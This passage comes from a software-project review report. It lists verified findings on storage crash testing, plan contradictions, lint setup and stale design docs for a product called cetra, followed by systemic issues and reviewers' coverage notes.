**Verifier evidence.** 00-design.md:90 D-P-32: 'M3 adds the month's usage to both' (the API and `cetra admin entitlements show`). 03-m3 changes only plan.tsx (:573) and the API response, and has no admin or EntitlementsReport change (grep). In origin/claude/p-m3-impl, the diff under crates/cli and crates/server/src/admin.rs only touches crates/cli/tests/e2e.rs, and there is no EntitlementsReport or month_units change.

#### P-8 — 00-design architecture text contradicts later decisions and the M3 plan

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** P
- **References:**
  - origin/claude/p-xtrack-fixes docs/plans/p-entitlements/00-design.md:152 (§ Request paths step 2: gRPC `RESOURCE_EXHAUSTED` with `RetryInfo`) vs D-P-35 (`UNAVAILABLE`)
  - 00-design.md:151-152 (`check_cap(&state, org, now)`, `rate::take(&state, org, spans, now)`) vs 03-m3 P2/P3 (`check_cap(state, org)`, `state.ingest_rate.take(org, spans, rate, burst, now)`)
  - 00-design.md:122-144 code layout (`web/src/routes/$org/settings/usage.tsx`; no routes/internal_orgs.rs, internal_usage.rs, internal_users.rs, internal_members.rs) vs D-P-42 and 03-m3 P10 (usage on plan.tsx)
  - 00-design.md:249 ('M1 can start now')

**Problem.** PR #92 updated the decisions, but § Request paths and § Code layout still describe the pre-M3 design. The gRPC rate refusal is given as RESOURCE_EXHAUSTED with RetryInfo, which D-P-35 rejected. The function signatures differ from M3's. The layout lists a usage page M3 does not build and leaves out the four internal route modules.

**Failure scenario.** The M4 or M5 plan writer, or a GLM implementer told to read 00-design first, follows § Request paths. They reintroduce RESOURCE_EXHAUSTED for rate limits, which OTel exporters do not retry, so rate-limited spans are dropped instead of retried. Or they create a separate usage route.

**Suggested fix.** Update § Request paths step 2 to `UNAVAILABLE` (D-P-35) and use M3's signatures. Fix § Code layout (plan.tsx usage section, the internal_* route modules, the M4 additions). Replace 'M1 can start now' with the current state.

**Verifier evidence.** PR #92 00-design.md:152 still says gRPC `RESOURCE_EXHAUSTED` with `RetryInfo` for the rate limit, against D-P-35 (:98, UNAVAILABLE). Lines :151-152 use `check_cap(&state, org, now)` and `rate::take(&state, org, spans, now)`, but 03-m3 has `check_cap(state, org)` (:177) and `take(&self, org, spans, rate, burst, now_ns)` (:221). The layout at :143 lists `web/src/routes/$org/settings/usage.tsx`, while M3 uses plan.tsx (:573). The internal_* route modules are missing from the layout. :249 still says 'M1 can start now', though M1 and M2 are merged.

### Track Q — cloud control plane (cetra-control)

Track Q's plans live in a private repository, so the full text of these findings (references, problem, failure scenario, fix and verifier evidence) is kept with that track rather than in this public file.

| Id | Severity | Verdict | Finding |
|---|---|---|---|
| Q-1 | major | CONFIRMED | Cloud OIDC provider id is `oidc:cloud`, so Q's redirect URI and authorize URL are wrong |
| Q-2 | major | CONFIRMED | Every self-hosted release build accepts cloud-1 control_plane and org tokens; D-Q-24 and D-Q-21 understate the blast radius |
| Q-3 | major | CONFIRMED | New-server restore never fences the old server, so two cells can run against one bucket |
| Q-4 | major | CONFIRMED | Quarterly restore drill copies customer data to the operator's own machine |
| Q-5 | minor | CONFIRMED | After a cell restore, the control plane does not re-push tokens and misreads a 404 |
| Q-6 | minor | CONFIRMED | Bucket lifecycle never removes delete markers, so the versioned bucket's index grows forever |
| Q-7 | minor | CONFIRMED | Restore runbook's reapply step is never tested and mounts the kept directory read-only |
| Q-8 | minor | CONFIRMED | Restore leaves copies of meta.db on the host, and D-Q-12 gives a different restore order from the runbook |

### Track R — storage hardening

#### R-1 — No milestone checks the model's reads after a crash in the middle of an operation; the existing kill -9 harness is not mentioned, and the lossy mode cannot reach it

- **Severity:** minor (reviewer: major) · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** R
- **References:**
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/00-design.md:19 (What exists today, Crash recovery row: crash_tests.rs only)
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/00-design.md:96-102 (M2: fs seam 'under cfg(test)'; 'in the hook-abort children: abort at the hook, then reopen after a lossy crash')
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/01-m1-model.md:64-66, 125, 420 (Crash only between completed ops; background tasks off)
  - crates/storage/tests/crash.rs:1-6, 186-289 (kill -9 harness with random kills during ingest, flush and compaction; checks acked rows, catalog files and partials only)
  - crates/storage/src/crash_tests.rs:268-330, 407-456 (fixed scenarios per hook; checks row ids, file counts, obsolete and staged rows)
  - crates/storage/src/hooks.rs:190-235 (pause blocks on a condvar; abort_at calls process::abort)

**Problem.** Design goal 2 is 'never returns a wrong result', and the design treats crash recovery as covered except for unsynced writes. Four facts break that:
- M1's Crash op only runs between completed ops, with every background task off (model_config). So it equals 'lose the memtable, replay the WAL'. No flush, compaction, deletion rewrite, retention, drop or GC is ever in flight when it fires.
- The tests that do crash mid-operation do not check the read model. crash_tests.rs checks fixed scenarios per hook. tests/crash.rs, a random kill -9 harness the design does not mention, checks only acked rows, the catalog and partials. Neither checks the traces view, scores last-writer-wins, deletion coverage, sessions or metrics against an oracle.
- M2 cannot do what it says. It wants to 'abort at the hook, then reopen after a lossy crash'. But the lossy fs state lives in the child that aborted, so the parent cannot apply it.
- The fs seam exists only under cfg(test), and tests/crash.rs is an integration test that links the library without cfg(test). So the kill -9 harness can never use lossy mode.

**Verifier correction.** No milestone checks the full read model (traces view values, scores, sessions, metrics) after a crash in the middle of an operation. M1 crashes only between completed ops with background tasks off. crash_tests.rs checks row ids, file counts and deletion coverage (it does check deletion coverage) but not view values. tests/crash.rs, which the design omits, checks only spans. M2's 'abort at the hook, then reopen after a lossy crash' must say that the child applies the lossy crash before process::abort, because the parent has no record of unsynced writes. The cfg(test) lossy shim cannot serve tests/crash.rs; only LazyFS covers that path.

**Failure scenario.** A deletion rewrite or a compaction is interrupted after its outputs are durable but before its catalog commit. On reopen, the half-done state (staged outputs, recomputed traces partials, deletions_applied_seq) shows a covered row or a doubled partial. No test catches it:
- crash_tests' fixed dataset does not hit the case.
- tests/crash.rs only compares row ids.
- The M1 model never crashes mid-operation.
The weak model then implements M2 by literally aborting the children and then trying to 'apply a lossy crash' from the parent, which has no record of what was unsynced.

**Suggested fix.** Add a 'crash at a hook' mode to the model test, scheduled as an M2 sub-phase. It re-executes the binary as crash_tests does:
- The child replays a case's op list. On the last op it arms `abort_at(point)` and runs that op (compact, apply_deletions, a flush via restart, GC, retention or drop).
- For lossy mode, the child applies the seeded lossy crash to the directory before it calls process::abort.
- The parent rebuilds the model by applying the same op list to the oracle, then reopens the directory and runs check_full.
- Op results must be reproducible: derive deletion ids from (case, op index) instead of Uuid::now_v7, and resolve deletion scopes through the oracle in the parent.
In the design, also:
- add tests/crash.rs to the 'What exists today' table;
- state that the lossy shim cannot serve integration tests, and either move the kill -9 harness into src/ or leave it to LazyFS.

**Verifier evidence.** I reviewed fe89e5e, the newest pushed design. The local branch claude/r-m1-model (aaead3e, c8ff25f) adds only code.
- 01-m1-model.md:64-66 and 125: Crash drops the storage between ops that `block_on` has already completed, and model_config turns every background task off. So M1 never crashes in the middle of an operation. Verified.
- tests/crash.rs:1-6 and 186-289 is a kill -9 harness with background flush and compaction on (child_config: interval 200ms). It appends spans only and checks acked rows, the catalog and source pairs. 00-design.md never mentions it: grep for 'crash.rs' and 'kill -9' finds nothing, and table row 19 names crash_tests.rs only. Verified.
- However, crash_tests.rs:505-580 (every_deletion_hook_aborts_safely) does check deletion coverage. Trace 1 is hidden in both the spans and traces providers, no file on disk holds a trace-1 row, and the deletion status is Applied. So 'neither checks deletion coverage' is false. What is truly unchecked after a mid-op abort: traces-view values (doubled or stale partials), scores, sessions and metrics.
- 00-design.md:102 ('in the hook-abort children: abort at the hook, then reopen after a lossy crash'). The lossy state is recorded in the process (line 96), so the child would have to apply the crash before process::abort (hooks.rs:199-203). The design does not say so; that is an ambiguity, not a proven impossibility.
- The cfg(test) shim cannot reach tests/crash.rs, which is an integration test. True, but line 107 has LazyFS run 'the existing crash children and a short ingest', which partly covers real-binary loss.

#### R-2 — R1.3 and R1.5 disagree on which project DropB is checked under

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** R
- **References:**
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/01-m1-model.md:461 ('Ops without a project (Compact, Gc; later ApplyDeletions, DropB) run check_quick on both projects')
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/01-m1-model.md:600 ('Op::project() returns ... Some(P::B) for DropB')
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/01-m1-model.md:506-515 (run_case dispatch on op.project())

**Problem.** R1.3 lists DropB among the project-less ops, which are checked on both projects. R1.5 makes `Op::project()` return `Some(P::B)` for DropB. Through run_case, that means only B is checked after a drop. A weak model implementing R1.5 cannot tell which rule is meant. If it follows R1.5, nothing checks project A right after a drop in the random runs. Only the single hand-written `drop_keeps_project_a` case does.

**Failure scenario.** A drop_project bug publishes a read state that hides or corrupts project A's rows. The next op is a Score or Append on B, which runs check_quick on B only. The bug stays unobserved until a later op touches A, and it shrinks badly or is masked by a later restart.

**Suggested fix.** Make `Op::project()` return `None` for DropB in R1.5, so both projects are checked after a drop. That matches R1.3. Alternatively, remove DropB from R1.3's list. Either way, state one rule.

**Verifier evidence.** 01-m1-model.md (fe89e5e) has two conflicting rules.
- Line 461 (R1.3) lists DropB among the ops with no project, which run check_quick on both projects.
- Line 600 (R1.5) says Op::project() returns Some(P::B) for DropB.
- run_case (lines 506-515) dispatches on op.project(), so under R1.5 only B is checked after a drop. DropB is also not among Restart/Crash/Settle, so check_full does not run after it either.
The two rules contradict each other as the finding says.

#### R-3 — R1.6 states two expected values that the code or the plan's own rules contradict

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** R
- **References:**
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/01-m1-model.md:644-650 (metrics KPIs: 'the cost sum', 'the token sum', 'All four are None when there is no such trace')
  - crates/storage/src/reads/metrics.rs:893-919 (kpi_values: cost and tokens are taken from a SQL SUM)
  - crates/storage/src/views/sessions.rs:79-84 (exact_cost_sum = SUM over cost_total cast to decimal: null when every input is null)
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/01-m1-model.md:634 (windowed list: 'That is class 1 and class 2')

**Problem.** (a) Metrics KPIs. CostTotal and TotalTokens are SQL SUMs. They are `None` whenever no trace in the window has a cost (or tokens), even when traces exist. The plan only says the value is 'the cost sum' and is None 'when there is no such trace'. That reads as `Some(0.0)` when traces exist without cost. Such traces are common: a trace whose only visible span is span 0 has no LLM span. The plan does spell out the None rule for sessions and for ExpectedTrace, but not here.
(b) Windowed list. The parenthetical 'That is class 1 and class 2' is not always true. Take a class-2 trace whose spans 0–9 are covered by a deletion, with spans 10–11 appended afterwards. Its merged start_time is midnight(D+2), so it falls outside [D+1, D+2).

**Failure scenario.** A weak model implements the KPI oracle as sum-or-0.0, or hard-codes the window membership by class. The first random case with an Append{count:1} trace alone in the window, or with a partially deleted class-2 trace, fails. It is then logged in R1.8 as a storage 'finding', or 'fixed' by changing correct storage behaviour.

**Suggested fix.** (a) In R1.6, say that CostTotal and TotalTokens are `None` when no trace in the window has a value, as for sessions, and `Some(sum)` otherwise.
(b) Delete 'That is class 1 and class 2', or reword it as 'usually class 1 and class 2; compute it from the merged start_time'.

**Verifier evidence.** (a) metrics.rs:872-919 builds the cost and tokens KPIs from SQL sums (exact_cost_sum and sum(TOTAL_TOKENS)). f64_at (metrics.rs:1554-1557) returns None for a null value, so the KPI is None when traces exist but none has a cost.
- In the plan's shapes (m.md:240-245), only odd (LLM) spans carry a cost or tokens, and Append can have count 1 (m.md:389). A trace whose only span is span 0 therefore has neither, and such traces occur.
- m.md:644-650 says only 'the cost sum' and 'None when there is no such trace'. That is ambiguous: it reads as Some(0.0). The plan does spell out the None rule for sessions (line 636) and for the trace row (line 358), and it gives a different rule ('always Some, 0.0') for alert Cost (line 660), which adds to the confusion.
(b) m.md:225 and 233 put class-2 spans s>=10 at or after midnight(D+2). If spans 0-9 are covered by a trace deletion and 10-11 are appended later, the merged start_time is midnight(D+2), outside [D+1, D+2). The 'That is class 1 and class 2' parenthetical at line 634 is therefore not always true. The primary rule ('merged start_time in [from,to)') is correct, so (b) is a small wording fix.

#### R-4 — M3's `cfg(fuzzing)` entry points need a check-cfg entry in the root Cargo.toml, which R's scope of edits does not include

- **Severity:** minor · **Verdict:** PLAUSIBLE · **Kind:** agents-rule · **Owner:** R
- **References:**
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/00-design.md:116 (entry points under cfg(any(test, fuzzing)))
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/00-design.md:194-199 (scope of edits: no root Cargo.toml)
  - crates/storage/Cargo.toml:10-11 and crates/otel/Cargo.toml:10-11 ([lints] workspace = true)
  - Cargo.toml:14-18 ([workspace.lints.rust] has no unexpected_cfgs entry)
  - AGENTS.md § Parallel work and ownership (root Cargo.toml is shared)

**Problem.** Rust 1.99 checks cfg names by default, so `#[cfg(any(test, fuzzing))]` in cetra-storage and cetra-otel raises `unexpected_cfgs` for `fuzzing`. `just check-rust` runs clippy with `-D warnings`, so the build fails. The fix is `unexpected_cfgs = { level = "warn", check-cfg = ['cfg(fuzzing)'] }`. Both crates use `[lints] workspace = true`, and Cargo does not accept crate-level lint keys next to that. So the entry must go in the root Cargo.toml's `[workspace.lints.rust]`. The design does not mention it, and its scope of edits does not include the root manifest.

**Verifier correction.** `cfg(any(test, fuzzing))` will trigger unexpected_cfgs under -D warnings on Rust 1.99. The design does not say how the `fuzzing` cfg is declared. Options: a build.rs `cargo::rustc-check-cfg` in each crate (in scope), a local allow, or a root `[workspace.lints.rust]` check-cfg entry, which would need the coordinator. M3's plan should pick one.

**Failure scenario.** An implementer of M3's plan adds the entry points and `just check` fails on unexpected_cfgs. The weak model then either removes `lints.workspace = true` from the crate, losing `unsafe_code = forbid`, `unwrap_used` and the other workspace lints, or edits the root manifest without leave.

**Suggested fix.** M3's plan should add the root Cargo.toml `[workspace.lints.rust] unexpected_cfgs` check-cfg entry for `fuzzing` to R's scope of edits (it changes no dependency pin), or request it from the coordinator. The design's Cross-cutting rules should mention it.

**Verifier evidence.** - rust-toolchain.toml pins 1.99.1, where check-cfg is on by default. `fuzzing` is not a well-known cfg, so it would raise the unexpected_cfgs warning.
- justfile:17 runs clippy with -D warnings.
- Cargo.toml [workspace.lints.rust] (lines 14-18) has no unexpected_cfgs entry, and crates/storage/Cargo.toml uses `[lints] workspace = true`.
- 00-design.md:194-199 does not list the root Cargo.toml in the scope of edits.
So the gap is real. But the claim that the entry 'must go in the root Cargo.toml' is wrong. A crate-local build.rs that emits `cargo::rustc-check-cfg=cfg(fuzzing)`, or `#[allow(unexpected_cfgs)]` on the entry points, stays inside crates/storage and crates/otel. Both are within R's scope, and neither drops the workspace lints. The M3 plan is not written yet.

#### R-5 — M5 and M7 plan checks that need crate-private internals or the server, from places that cannot reach them

- **Severity:** minor · **Verdict:** PLAUSIBLE · **Kind:** plan-defect · **Owner:** R
- **References:**
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/00-design.md:169 (soak.rs in crates/storage/tests samples files per level, compaction lag, WAL bytes; 'The M1 model's checks run on a sample of traces at the end')
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/00-design.md:154 (memory limit runs 'must end in 503/422 refusals')
  - docs/mvp-decisions.md:289 (D-A1-12: benchmarks are integration tests because 'the engine's internals are crate-private')
  - crates/storage/src/lib.rs:130-140 (StorageHealth: WAL-failed flags and memtable bytes only), 1033-1075 (catalog_files and staged_paths are cfg(test))
  - origin/claude/r-hardening-design-43eb31:docs/plans/r-hardening/01-m1-model.md:22, 72-118 (model_tests is a cfg(test) module with pub(super) items)

**Problem.** (a) M7's soak is placed in `crates/storage/tests/soak.rs`, an integration test that links the library without cfg(test). It can see only the public API. It therefore cannot:
- call the M1 oracle or checks, which live in the cfg(test) `src/model_tests`;
- read files per level, compaction lag or WAL bytes, which no public API exposes.
D-R-2 says that adding a public API stops and goes to the coordinator first.
(b) M5's memory-limit runs expect HTTP 503/422. Those codes exist only in cetra-server, which is outside R's scope ('Changes to ... the server are requested from the coordinating session').

**Verifier correction.** M7's soak in tests/soak.rs cannot reuse the cfg(test) M1 oracle and checks. The design should put the end-of-soak model check in-crate, or drop it. The sampled metrics can come from health()/read_cache_stats() plus reading catalog.db and the WAL directory directly, as tests/crash.rs does, with no new API. M5's 503/422 expectation should say whether it runs the real binary (no server edit needed) or what the storage-level outcome is.

**Failure scenario.** When M7's plan is written or implemented, the weak model either:
- copies the oracle into tests/soak.rs, so two oracles drift apart;
- makes model_tests public, a non-test API change;
- adds public stats methods to Storage without the coordinator.
For M5, it writes a storage-level test that can never see a 503 and silently checks something weaker.

**Suggested fix.** In the design:
- Put the soak's model check in-crate, as an ignored unit test under `src/`, or drop that sentence.
- List the metrics the soak samples that need a new public `Storage` stats call, and mark that call as a coordinator request, or read catalog.db and the WAL directory directly.
- For M5, restate the expected outcome at the storage boundary (QueryError::Busy or TooLarge, AppendError::DiskFull), or name where a server-level test would live and who owns it.

**Verifier evidence.** (a) 00-design.md:169 places the soak in crates/storage/tests/soak.rs and says 'The M1 model's checks run on a sample of traces at the end'. M1's model and checks live in the cfg(test) src/model_tests (m.md:22), which an integration test cannot reach. That part holds.
- However, 'files per level, compaction lag, WAL bytes' do not need a new public API. tests/crash.rs already reads catalog.db directly (read_catalog, crash.rs:480) and walks the directory. Memtable bytes come from the public Storage::health (lib.rs:130-140, 777), and the read cache from the public read_cache_stats (lib.rs:772).
(b) 00-design.md:154 says only that the memory-limit runs end in 503/422. It does not say they are storage-level tests. Running the real `cetra serve` under systemd-run and sending HTTP needs no edit to the server crate. Location and ownership are unstated rather than impossible.
M5 and M7 plans are not written yet.

## Systemic issues

1. **Plans are not updated after they ship.** Several design or README files still describe pre-delivery status, APIs or decision owners, and they contradict decisions taken later: A1-2, A2-4, B-6, DE-7, G-5, I-6, N-7, P-8. Weaker models are told to follow these files, so stale text sends them wrong. Fix: a track's closing sub-phase updates its README status, its design file and its roadmap row, and the reviewer checks that.
2. **Review follow-ups and open questions have no owner.** Items a review left open were never decided or assigned, and some now cause real defects: CSV formula injection (A2-5), C's product questions (C-3), E20 (DE-3), G's requests to B1/A1 and its review backlog (G-3, G-4), L's contract gaps CG1–CG5 (L-2), the R2 capture re-check (B-3), D's P26 security review (DE-1). Fix: every open item from a review becomes either a decision or a row with an owner in `docs/roadmap.md`, and a track cannot be marked Done while it has unowned items.
3. **Risks accepted only in a plan README.** Known limits and deviations are recorded in a plan's README but not in the spec or `docs/mvp-decisions.md`, so other tracks build on the spec's stronger promise: H-1/A2-1, H-5, DE-5, A2-3, G-2, F0-5. Fix: AGENTS.md already says a deviation updates the spec in the same change; reviews should treat a README-only "known limit" as a deviation.
4. **Memory and resource bounds stop at row counts.** Results, decode buffers and scans are capped by count or not at all, not by bytes or admission: A2-1, G-1, H-5, I-3, M-2. Fix: one cross-track decision on byte bounds for response bodies and pre-auth decode, owned by the coordinator.
5. **Erasure is not end to end.** Deletion is checked at the file and memtable level but not for the WAL (A1-1), late judge output (M-1), logs (A1-5), or operator copies made by restore drills and runbooks (Q-4, Q-8). Fix: track R's model (or M) should state erasure as a property over every place data can live, and test it.
6. **Promised tests were narrowed without a record.** A1-4 (retention crash child, compaction order), A2-2 (deep-filter stack test), B-2 (truncation property), B-5 (nesting depth), N-3 (S3 backup round trip), R-1 (reads after a mid-operation crash). Fix: when a test is narrowed, record it in the plan's deviations and in the spec's testing section.
7. **Steps a weak model cannot execute as written.** The still-open plans contain cross-phase contradictions and missing specifics that a Haiku or GLM implementer would have to guess: I-1, I-5, M-5, N-4, N-5, N-10, P-4, R-2, R-3, R-4, R-5. Fix: before each plan is handed over, one Sonnet pass checks every file and command a step names against the phases before it.
8. **The roadmap claims more than landed.** A1-3 (benchmark evidence never merged, 5M run pending), L-3 (G's check of L's pages never ran), N-9 (commands documented before they exist), DE-1. Fix: a roadmap "Done" needs a link to the evidence.


## Dropped findings

- **DE-6** Spec 12 still puts OIDC behind the SSRF guard; the code exempts it, and the spec note P23 asked for was never written — refuted: Spec 12 already documents the OIDC exemption. Only the leading list '(webhooks, LLM connections, OIDC, Slack)' still names OIDC; drop it from that list as a wording cleanup.
- **F0-4** The `.cursor/` Open item was decided ('ignore it') in Phase 0 but is still open, and D58 still says `.cursor/rules` is kept — refuted: phase-0/07-review-fixes.md:32 records the user's answer as 'Ignore it. This plan does not touch `.cursor/` or its Open-list entry.', and :686 requires that § Open still list `.cursor/`. Leaving the Open entry was therefore deliberate, not a decision someone forgot to apply. The claim that no `.curso
- **H-1** SQL JSON results (console and MCP query_sql) have no byte bound; accepted only in the plan README, not in spec or decisions — merged into A2-1
- **H-2** CSV exports write formula-looking cells verbatim; A2's open question on CSV injection was never decided before H shipped exports — merged into A2-5
- **L-5** A signed-out user on a live list is never redirected: SSE reconnects fail on 401 forever, and D-L-1's 'next list refetch' never comes — merged into C-1

## Appendix: reviewer coverage

What each reviewer read and checked, and what it could not check, in its own words.

### Track A1 — storage

I read all 14 files in docs/plans/a1-storage/ (00-design, S1/S1b, M1, M2, M3a/b, M4a/b, M5a/b, M6a/b/c), the A1 parts of spec 03 (§1 checkpoint, §4 schema, §6, §7 Guarantee), spec 12's config table, the A1 decisions, the roadmap A1 row and the cross-track review (X1 to X38). I checked delivery against main, not line by line:
- the catalog migrations against spec 03 §4 (they match);
- every crash child, crash point list and parent in crates/storage/src/crash_tests.rs, and the `justfile` test recipe (all five crash parents run in `just test`, and CI runs that recipe);
- tests/crash.rs: final compaction, level-0, obsolete-row and temp-file checks;
- the model test ops (append, restart, compact, gc, delete, apply, retention);
- about 45 test names the plans promise for M4 to M6c (all present; quarantine retention and drop are split into two tests);
- the durability-order recorder;
- unwrap/expect outside tests in A1 modules (none);
- log lines that print errors or paths in compaction, flush, gc, media and read-cache code;
- WAL truncation and rotation code;
- the research result files (traces-benchmark.md, compaction.md, benchmarks.md) and whether the S1 results branch is merged.
I did not run any tests, the crash harness or the benchmarks. I did not re-check DataFusion API use. The A2-owned modules (filter/, sql/, views/, reads/) and the M-owned reads were left out. I did not repeat findings X17, X20, X22, X26, X27, X30, X31 or X35.

### Track A2 — query

Read in full: docs/plans/a2-query/README.md, docs/plans/a2-fixes/README.md and all seven a2-fixes phase files (P1 to P7), docs/plans/a2-query/03-sql-console.md (Q12 and Q13), docs/reviews/a2-query.md, docs/spec/05-query.md, the D89 to D101 and D-A2-1 to D-A2-4 rows of docs/mvp-decisions.md, the A2 row of docs/roadmap.md, and the A2-relevant parts of the cross-track review (X7, X17; nothing else there touches A2). I did not re-report anything from those two reviews.

Checked against the code on this branch (main at 4cca6bc):
- P1 to P7 landed one commit each (a46e1a3, 47cd6d7, 9cf5772, 665282f, 8cf62cf, 09b0bba, e211e9e), and every test the phases promise exists by name.
- P1's INTERSECT/EXCEPT table-cap deviation is recorded in D-A2-1 and in spec 05.
- The guard (views/guard.rs, views/session.rs) matches P2 and P3.
- A1 M6.1's bounded QueryPool exists (memory.rs). Its "the shared query memory is in use" error becomes TooLarge; D-A1-8 records that choice.
- Follow-up 7df11ea (exact metric cost sums) was compared with the docs.
- Server side: http/error.rs logs RunError by kind only. routes/sql.rs bounds timeout_ms and requires role member only for exports. cli/main.rs gives runtime threads an 8 MiB stack. MetricsCache exists. experiment_items and dataset_items are not registered yet; H's README defers them to track J.
- sql/run.rs and sql/encode.rs have no byte budget anywhere.
- The m-8 dead_code allows and the m-3 nested-timestamp gap are still present (backlog, not re-reported).

Probe: a throwaway sqlparser 0.62 program in the scratchpad (since deleted) confirmed that 13,000-term chains of `&&` and `:=`, which is_operator does not count, parse, visit and drop on a 2 MiB stack in debug and release. DataFusion 55.2 rejects both operators as unsupported before it builds a deep expression. So they are not a crash vector, and I did not report them.

Not done:
- No cargo tests were run on the repository: it is read-only and full suites are excluded. The A2-1 amplification comes from reading the code (zero-copy projection, then per-cell JSON encoding with no byte cap); I did not reproduce it.
- I did not verify whether physical planning of the 512-deep `~~` chain fits on a 2 MiB stack; A2-2 is about the test that no longer covers it.
- Q1 to Q20 were not re-checked line by line; the earlier review did that.

### Tracks B1/B2 — normalization and capture

Read X1–X38 in the cross-track review first (origin/claude/cross-track-review-6a41ad:docs/reviews/cross-track.md). Nothing below repeats them. X29 (custom prices have no owner) and X37 (Node PATH) touch B1/B2, but the findings here are separate issues.

**Plans read in full:**
- docs/plans/b1-normalization: README and 01–06 (N1–N23)
- docs/plans/b2-capture: README and 01–05 (K1–K20)

**Checked against main:**
- Spec 02: Limits, Pipeline, the token semantics table, rules 1–21, Truncation, Cost computation and Testing.
- mvp-decisions D102–D122 and D-B1-1…10, and the roadmap B1/B2 rows.
- Code: crates/otel (lib/error/decode/cost/context/truncate/media/normalize/warn/reject, tests/golden.rs, tests/proptest.rs, tests/prices.rs).
- Fixtures: all of fixtures/otlp. Every case has expected.json, PENDING is empty, and there are 51 captured cases. I scripted reads of the expected token, cost and provider values, and matched the captured models and providers against crates/otel/prices/builtin.json.
- tools/capture: Cargo.toml, the test inventory of every module, the py/ts project pins, the justfile recipes, AGENTS.md and tools/README.md.

**Verified as delivered:**
- The public API of crates/otel.
- The closed warning and rejection sets.
- DecodeError privacy.
- PATTERN_SIZE_LIMIT.
- The media size check before decoding.
- The proptest properties, apart from the narrowing in B-2 and B-5.
- The promised B2 tests: scenario validation, wire renderers, mock, receiver, determinism, scrub, writer, and run/discover/program_env/--check.
- The capture recipes.
- The 7-day rule in uv and pnpm. google-adk has a documented exclude-newer-package exception.

**Not done:**
- I ran no tests and built nothing (as instructed).
- Two claims are inference from reading code and data, not runtime output:
  - B-1: every captured Gemini span gets a null cost under the built-in table.
  - B-5: the 10 000-level JSON test fails with a type error at depth 7.
- I did not check the server side of the B1 seam (how the server builds IngestLimits and the price table). That is outside area B and is covered by X29.
- I did not re-run captures.

### Track C — web UI

Read first: the cross-track review (origin/claude/cross-track-review-6a41ad:docs/reviews/cross-track.md, X1–X38). It barely touches track C, apart from X37 (nvm path) and X38 (fixture IDs), which I did not re-report. Then read all of docs/plans/c-web-ui/README.md and docs/plans/c-fixes/ (README and 01–06, CF1–CF11), plus the earlier review docs/reviews/c-web-ui.md, spec 11, the Track C section of mvp-decisions (D-C-1 to D-C-5), the roadmap C row, and the C-related parts of the G design (D-G-13, D-G-22, D-G-33, § Review findings) and the G M5 plan.

Checked each c-fixes phase against main:
- CF1: vite timeouts, asyncUtilTimeout, the onUnhandledFrame collector, traces5k in beforeAll.
- CF2: hasTopLevelOr/skipNextAnd in splitConjuncts, appendFilter, and the dsl, logic and filter-bar tests.
- CF3: the useDefaultSavedView rewrite, applyDefaultView set in the sidebar, palette and switcher, the withoutConstraints workaround removed, the three new tests.
- CF4: headerRef, totalWidth, the scroll mirror, selectedIndex, the three tests.
- CF5: classifyMedia, mediaUrl removed, the media-chip tests.
- CF6: the previous-call skeleton and error, the two tests.
- CF7: the 6 tree tests and split-pane.test.tsx.
- CF8: accessibilityLayer=false, tabIndex=-1, the group keyboard model, the 3 tests.
- CF9: pushBuffered, firstPageWouldExceed, setLiveLimits, the overflow pill, timer pruning, the tests.
- CF10 and CF11: search in TraceStreamParams and traceStreamUrl, and the docs.

All 11 phases landed with their promised tests (PR #41). Their decisions and spec text are in place.

Also checked:
- no console.* or vi.mock in web/src;
- that no other media or HTML sink bypasses classifyMedia;
- the other AND-join sites;
- whether the C review's minors were later fixed: minors 4, 6, 8, 26 and 27 are still present.
- I read lib/sse.ts, use-live-traces.ts, the live wiring in traces/index.tsx and trace-view.tsx, and the stream validation in routes/streams.rs.

Not checked:
- I did not run any tests or the browser.
- The TanStack Query cancel-on-invalidate behaviour in C-2 is from the v5 defaults (refetchQueries sets cancelRefetch to true; Query.fetch cancels an in-flight fetch when data exists). I did not observe it with a real server under load.
- I did not re-verify the 27 minors or the U1–U29 sub-phases line by line; the earlier review covered them.

### Tracks D/E — metadata, auth and eval library

Read first: the cross-track review (origin/claude/cross-track-review-6a41ad:docs/reviews/cross-track.md, X1–X38). My findings do not repeat it. X25 and X32 touch D's spec 08 wording and the auth-track ownership, and I added nothing there.

Read in full: docs/plans/d-meta-auth/README.md, 01-foundation.md and 07-security-review.md; the P9–P13 and P25 sections of 03/06; the section and test headings of 04/05/06; docs/plans/e-eval/README.md, including the E20 review section. Read the D135–D167 rows in docs/mvp-decisions.md, the D and E rows in docs/roadmap.md, spec 06 (judge, webhook, check, mapping and retry sections), the spec 08 password and reset lines, and the spec 12 SSRF line.

Checked delivery against main using the merge contents of PR #21/#25 (D: P1–P25 commits) and #23/#26 (E: E1–E20 commits). Code spot-checks:
- meta: open_existing and SchemaMismatch.
- auth: last_used coalescing; the key and PAT caches and their eviction; the limits and lockout bounds; the common-password list.
- OIDC: hd check, Entra refusal, metadata TTL and the redirect policy.
- the generated access suite, credentials file modes, mailer log privacy, the /cli-auth page, and the project members routes.
- crates/eval: the egress deny ranges, judge HTTP classification, webhook status classification and categorical parsing, Cargo deps (core and otel only), the tests included via #[path], snapshots, just eval-live, the built-in templates, the cetra-eval-external rewrite in the server, and unwrap/TODO sweeps.

Not checked: P2–P25 were not reviewed line by line against each test bullet. I did not run any tests, and I did not verify that E20 was done by a different model.

### Track F, phase 0 and maintenance

